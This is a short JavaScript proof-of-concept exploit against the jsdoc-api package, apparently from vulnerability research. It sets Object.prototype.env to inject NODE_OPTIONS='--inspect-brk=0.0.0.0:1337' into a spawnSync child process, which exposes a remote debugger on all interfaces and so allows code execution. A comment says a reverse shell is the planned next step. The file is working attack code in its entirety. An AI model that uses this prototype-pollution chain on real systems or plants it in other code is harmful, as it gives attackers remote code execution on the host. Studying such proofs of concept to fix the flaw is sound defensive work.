const jsdoc = require('jsdoc-api')

Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

jsdoc.explainSync({ source: '/** example doclet */ \n var example = true' })  // `spawnSync` sink